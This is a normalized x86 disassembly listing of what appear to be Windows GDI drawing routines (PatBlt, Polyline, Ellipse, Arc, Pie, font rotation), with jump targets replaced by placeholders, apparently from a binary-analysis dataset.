mov edi [ ebp - 0x14 ]
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffc8
call sub_4729f8
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x4 ]
call sub_41e234
mov edx [ ebp + 0x8 ]
mov [ edx - 0x24 ] eax
xor esi esi
xor ebx ebx
cmp esi [ ebp - 0xc ]
jl r-xdata
inc ebx
push 0xf00021
push 0x1
lea eax [ ebx + 0x1 ]
push eax
mov eax edi
dec eax
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0x34 ]
jle r-xdata
push 0xf00021
push 0x1
lea eax [ ebx + 0x1 ]
push eax
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0x2c ]
jge r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebx + esi ]
mov edx [ ebp - 0x10 ]
call sub_474024
pop ecx
push 0xf00021
mov eax [ ebp - 0x14 ]
sub eax edi
push eax
push 0x1
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
add eax ebx
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
push eax
call PatBlt
cmp esi [ ebp - 0xc ]
jge r-xdata
cmp ebx [ ebp - 0x8 ]
jl r-xdata
dec edi
inc edi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_474308
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffc8
call sub_4729f8
mov eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x10 ]
shr eax 0x1
mov [ ebp - 0x8 ] eax
xor ebx ebx
xor esi esi
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x4 ]
call sub_41e234
mov edx [ ebp + 0x8 ]
mov [ edx - 0x24 ] eax
cmp esi [ ebp - 0x4 ]
jge r-xdata
add ebx [ rw-data ]
cmp ebx [ ebp - 0x8 ]
jl r-xdata
add esi [ rw-data ]
mov eax [ ebp + 0x8 ]
push eax
lea eax [ esi + ebx ]
mov edx [ ebp - 0x20 ]
call sub_474024
pop ecx
mov eax [ ebp + 0x8 ]
mov edi [ eax - 0x38 ]
add edi esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
add eax ebx
mov [ ebp - 0x1c ] eax
mov eax ebx
add eax eax
mov edx [ ebp - 0x10 ]
sub edx eax
mov [ ebp - 0x14 ] edx
mov eax esi
add eax eax
mov edx [ ebp - 0xc ]
sub edx eax
mov [ ebp - 0x18 ] edx
push 0xf00021
mov eax [ ebp - 0x14 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x1c ]
push eax
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
push eax
call PatBlt
push 0xf00021
mov eax [ ebp - 0x14 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
sub eax esi
dec eax
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
push eax
call PatBlt
push 0xf00021
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
push eax
call PatBlt
push 0xf00021
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
sub eax ebx
sub eax [ rw-data ]
push eax
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
push eax
call PatBlt
cmp ebx [ ebp - 0x8 ]
jge r-xdata
cmp esi [ ebp - 0x4 ]
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_474454
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x3c ] ecx
mov ebx edx
mov [ ebp - 0x28 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x3c ]
call sub_41cd14
mov [ ebp - 0x3c ] eax
mov eax [ ebp + 0xc ]
call sub_41cd14
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x3c ]
call sub_406c84
and eax 0xff
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x3c ]
call sub_406c88
and eax 0xff
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x3c ]
call sub_406c8c
and eax 0xff
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0xc ]
call sub_406c84
and eax 0xff
sub eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
call sub_406c88
and eax 0xff
sub eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
call sub_406c8c
and eax 0xff
sub eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov esi ebx
lea edi [ ebp - 0x38 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x30 ]
cmp eax [ ebp - 0x38 ]
jge r-xdata
cmp [ ebp + 0x8 ] 0x2
je r-xdata
mov eax [ ebp - 0x2c ]
cmp eax [ ebp - 0x34 ]
jge r-xdata
lea edx [ ebp - 0x30 ]
lea eax [ ebp - 0x38 ]
call sub_47698c
lea edx [ ebp + 0xc ]
lea eax [ ebp - 0x3c ]
call sub_47698c
xor eax eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0xffffffff
mov al [ ebp + 0x8 ]
sub al 0x2
jb r-xdata
lea edx [ ebp - 0x2c ]
lea eax [ ebp - 0x34 ]
call sub_47698c
push ebp
xor eax eax
call sub_4740c4
pop ecx
jmp r-xdata
sub al 0x2
jb r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
push ebp
mov al 0x1
call sub_4740c4
pop ecx
jmp r-xdata
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
call SelectObject
push eax
call DeleteObject
push ebp
call sub_474308
pop ecx
dec eax
sub al 0x2
jb r-xdata
push ebp
call sub_4741f0
pop ecx
jmp r-xdata
jmp r-xdata
sub_4745a8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_41d9fc
push eax
push esi
mov eax [ ebx + 0x4 ]
call sub_41e234
push eax
call FillRect
pop esi
pop ebx
retn
sub_4745cc
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x3c ]
mov edx 0x1
mov eax [ ebx + 0xc ]
call sub_41d7ec
dec [ ebp - 0x18 ]
dec [ ebp - 0x1c ]
test esi esi
jle r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
dec esi
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0xc ]
call sub_41d6c0
mov eax [ ebp - 0x14 ]
mov [ edi ] eax
mov eax [ ebp - 0x10 ]
mov [ edi + 0x4 ] eax
mov eax [ ebp - 0x24 ]
mov [ edi + 0x8 ] eax
mov eax [ ebp - 0x20 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0xc ]
mov [ edi + 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov [ edi + 0x14 ] eax
push 0x3
push edi
mov eax [ ebx + 0x4 ]
call sub_41e234
push eax
call Polyline
mov edx [ ebp + 0xc ]
mov eax [ ebx + 0xc ]
call sub_41d6c0
dec [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov [ edi ] eax
mov eax [ ebp - 0x8 ]
mov [ edi + 0x4 ] eax
mov eax [ ebp - 0x1c ]
mov [ edi + 0x8 ] eax
mov eax [ ebp - 0x18 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x14 ]
mov [ edi + 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov [ edi + 0x14 ] eax
push 0x3
push edi
mov eax [ ebx + 0x4 ]
call sub_41e234
push eax
call Polyline
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x24 ]
push eax
call InflateRect
test esi esi
jg r-xdata
sub_4746bc
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_41cd14
mov esi eax
mov edx esi
and dl 0xff
mov eax esi
shr ax 0x8
mov ecx esi
shr ecx 0x10
and cl 0xff
mov [ esp ] cl
cmp bl dl
jae r-xdata
xor edx edx
sub dl bl
jmp r-xdata
xor eax eax
sub al bl
jmp r-xdata
cmp bl al
jae r-xdata
mov [ esp ] 0x0
sub [ esp ] bl
jmp r-xdata
cmp bl [ esp ]
jae r-xdata
mov cl [ esp ]
xchg edx eax
call sub_406c68
pop edx
pop esi
pop ebx
retn
sub_474714
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx ebx
call sub_4746bc
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx ebx
call sub_4746bc
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_41d9c8
pop ebx
pop ebp
retn
sub_474760
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x10 ] ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0x18 ]
push esi
push edi
lea edx [ ebp - 0x18 ]
mov ecx ebx
mov eax [ ebp - 0x8 ]
call sub_473330
push esi
push edi
lea edx [ ebp - 0x20 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_473330
mov eax [ ebp + 0x14 ]
push eax
push edi
lea edx [ ebp - 0x28 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_473330
push esi
mov eax [ ebp + 0xc ]
push eax
lea edx [ ebp - 0x30 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_473330
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_41dadc
test al al
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_41d9c0
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0xc0 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0xc4 ] edx
push esi
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0xc8 ]
mov ecx ebx
mov eax [ ebp - 0x8 ]
call sub_473330
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0xd0 ]
mov ecx ebx
mov eax [ ebp - 0x8 ]
call sub_473330
mov eax [ ebp + 0x14 ]
push eax
push edi
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0xd8 ]
mov ecx ebx
mov eax [ ebp - 0x8 ]
call sub_473330
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xd0 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx + 0xd8 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x20 ]
mov [ eax + 0xc0 ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0xc4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x30 ]
mov [ eax + 0xc8 ] edx
mov edx [ ebp - 0x2c ]
mov [ eax + 0xcc ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0xd8 ] edx
mov edx [ ebp - 0x24 ]
mov [ eax + 0xdc ] edx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0xc0 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0xc4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x20 ]
mov [ eax + 0xc8 ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0xcc ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0xd0 ] edx
mov edx [ ebp - 0x24 ]
mov [ eax + 0xd4 ] edx
mov eax [ ebp + 0x14 ]
push eax
push edi
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0xd8 ]
mov ecx ebx
mov eax [ ebp - 0x8 ]
call sub_473330
mov eax [ ebp - 0x8 ]
call sub_47320c
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0xd0 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_473330
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xd0 ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
push esi
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0xd8 ]
mov ecx ebx
mov eax [ ebp - 0x8 ]
call sub_473330
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xdc ]
cmp eax [ ebp - 0x1c ]
jge r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_47320c
jmp r-xdata
push ebp
mov al [ rw-data ]
call sub_474714
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0xc0 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0xc4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x20 ]
mov [ eax + 0xc8 ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0xcc ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x30 ]
mov [ eax + 0xd0 ] edx
mov edx [ ebp - 0x2c ]
mov [ eax + 0xd4 ] edx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_47320c
push ebp
mov al [ rw-data ]
call sub_474714
pop ecx
mov eax [ ebp - 0x8 ]
call sub_47320c
push ebp
mov al [ rw-data ]
call sub_474714
pop ecx
sub_4749ec
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
mov eax [ ebp + 0xc ]
push eax
lea edx [ ebx + 0xc0 ]
mov ecx esi
mov eax ebx
call sub_473330
push edi
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebx + 0xc8 ]
mov ecx esi
mov eax ebx
call sub_473330
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebx + 0xd0 ]
mov ecx esi
mov eax ebx
call sub_473330
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
lea edx [ ebx + 0xd8 ]
mov ecx esi
mov eax ebx
call sub_473330
mov eax ebx
call sub_47320c
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_474a5c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
push esi
mov eax [ ebp + 0xc ]
push eax
lea edx [ ebx + 0xc0 ]
mov ecx edi
mov eax ebx
call sub_473330
push esi
mov eax [ ebp + 0xc ]
push eax
lea edx [ ebx + 0xc8 ]
mov ecx [ ebp + 0x10 ]
mov eax ebx
call sub_473330
push esi
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebx + 0xd0 ]
mov ecx [ ebp + 0x10 ]
mov eax ebx
call sub_473330
push esi
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebx + 0xd8 ]
mov ecx edi
mov eax ebx
call sub_473330
mov eax ebx
call sub_47320c
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_474af4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp + 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_473488
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8c ]
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_474b34
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
cmp esi 0x168
jle r-xdata
mov dl 0x1
mov eax [ ebx + 0x10 ]
call sub_41dae4
mov eax [ ebx + 0x4 ]
call sub_41e234
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x44 ]
push eax
push 0x3c
mov eax [ ebx + 0x8 ]
call sub_41d1e8
push eax
call GetObjectA
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x2c ] 0x7
cmp [ ebx + 0xab ] 0x0
je r-xdata
sub esi 0x168
lea eax [ ebp - 0x44 ]
push eax
call CreateFontIndirectA
push eax
mov eax [ ebp - 0x8 ]
push eax
call SelectObject
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x5c ]
push esi
mov eax [ ebp - 0x8 ]
push eax
call SelectObject
push eax
call DeleteObject
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
fld [ ebx + 0xb0 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
push 0x48
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x1c ]
push eax
mov eax [ ebx + 0x8 ]
call sub_41d458
mov [ ebp - 0x48 ] eax
fild [ ebp - 0x48 ]
fmul [ ebx + 0xb0 ]
call sub_402b00
mov edx eax
mov eax 0x1
call sub_476954
push eax
call sub_4062e4
neg eax
mov [ ebp - 0x44 ] eax
sub_474c24
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov eax [ eax + 0x4 ]
call sub_41e234
mov ebx eax
push 0x0
push edi
push esi
push ebx
call MoveToEx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push ebx
call LineTo
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_474c58
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
push esi
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_473488
push esi
lea ecx [ ebp + 0xc ]
lea edx [ ebp + 0x10 ]
mov eax ebx
call sub_473488
mov eax [ ebx + 0x4 ]
call sub_41e234
mov ebx eax
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push ebx
call MoveToEx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push ebx
call LineTo
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_474cb8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
inc edi
push edi
push esi
mov eax [ ebx + 0x4 ]
call sub_41e234
push eax
call Polygon
pop edi
pop esi
pop ebx
retn
sub_474cf0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
call sub_41e234
push eax
call Ellipse
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_474d1c
push ebp
mov ebp esp
add esp 0xfffffea4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_41e234
mov [ ebp - 0x40 ] eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ ebx + 0x91 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_473488
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp + 0xc ]
lea edx [ ebp + 0x10 ]
mov eax ebx
call sub_473488
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x40 ]
push eax
call Ellipse
jmp r-xdata
mov eax [ ebp + 0xc ]
inc eax
push eax
mov eax [ ebp + 0x10 ]
inc eax
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_41e234
push eax
call Ellipse
mov eax [ ebp + 0x10 ]
add eax [ ebp - 0x4 ]
sar eax 0x1
jns r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
add eax [ ebp - 0x8 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x10 ]
sub eax [ ebp - 0x4 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0xc ]
sub eax [ ebp - 0x8 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x140 ]
mov ecx [ ebp - 0x10 ]
mov eax ebx
call sub_473330
mov esi 0x1
lea edi [ ebp - 0x138 ]
adc eax 0x0
mov [ ebp - 0x15c ] esi
fild [ ebp - 0x15c ]
fld [ r-xdata ]
fmulp st1
add esp 0xfffffff4
fstp [ esp ]
fwait
lea edx [ ebp - 0x38 ]
lea eax [ ebp - 0x28 ]
call sub_4729e4
fild [ ebp - 0x18 ]
fld [ ebp - 0x38 ]
fmulp st1
call sub_402b0c
add eax [ ebp - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
fild [ ebp - 0x14 ]
fld [ ebp - 0x28 ]
fmulp st1
call sub_402b0c
mov ecx eax
add ecx [ ebp - 0x10 ]
mov edx edi
mov eax ebx
call sub_473330
inc esi
add edi 0x8
cmp esi 0x20
jne r-xdata
mov eax [ ebx + 0x10 ]
call sub_41dadc
cmp al 0x1
je r-xdata
mov eax [ ebx + 0xc ]
call sub_41d7b4
cmp al 0x5
je r-xdata
mov eax [ ebx + 0xc ]
call sub_41d7b4
mov [ ebp - 0x39 ] al
mov dl 0x5
mov eax [ ebx + 0xc ]
call sub_41d7bc
mov eax [ ebx + 0x4 ]
call sub_41e234
mov [ ebp - 0x40 ] eax
lea edx [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov eax ebx
call sub_4732dc
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x158 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x154 ] eax
mov eax [ ebp - 0x140 ]
mov [ ebp - 0x150 ] eax
mov eax [ ebp - 0x13c ]
mov [ ebp - 0x14c ] eax
mov eax [ ebp - 0x138 ]
mov [ ebp - 0x148 ] eax
mov eax [ ebp - 0x134 ]
mov [ ebp - 0x144 ] eax
push 0x3
lea eax [ ebp - 0x158 ]
push eax
mov eax [ ebp - 0x40 ]
push eax
call Polygon
mov eax [ ebp - 0x138 ]
mov [ ebp - 0x150 ] eax
mov eax [ ebp - 0x134 ]
mov [ ebp - 0x14c ] eax
mov esi 0x1e
lea edi [ ebp - 0x130 ]
push 0x20
lea eax [ ebp - 0x140 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_41e234
push eax
call Polyline
jmp r-xdata
mov eax [ edi ]
mov [ ebp - 0x148 ] eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0x144 ] eax
push 0x3
lea eax [ ebp - 0x158 ]
push eax
mov eax [ ebp - 0x40 ]
push eax
call Polygon
mov eax [ edi ]
mov [ ebp - 0x150 ] eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0x14c ] eax
add edi 0x8
dec esi
jne r-xdata
mov dl [ ebp - 0x39 ]
mov eax [ ebx + 0xc ]
call sub_41d7bc
sub_474fa2
add [ eax ] al
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
call sub_41cd14
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
call sub_41e234
push eax
call SetPixel
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_474fd0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
call sub_41e234
push eax
call Arc
pop edi
pop esi
pop ebx
pop ebp
retn 0x18
sub_47500c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
call sub_41e234
push eax
call Pie
pop edi
pop esi
pop ebx
pop ebp
retn 0x18
sub_475048
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_41dadc
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_4746bc
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_4746bc
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_41d9c8
pop ebx
pop ebp
retn
sub_4750a0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x20c ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov al 0x20
call sub_475048
pop ecx
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x20c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x210 ]
sub eax edx
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x210 ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x214 ]
jne r-xdata
mov eax ebx
add eax eax
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffdf8
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_41e234
push eax
call Polygon
pop edi
pop esi
pop ebx
pop ebp
retn
inc eax
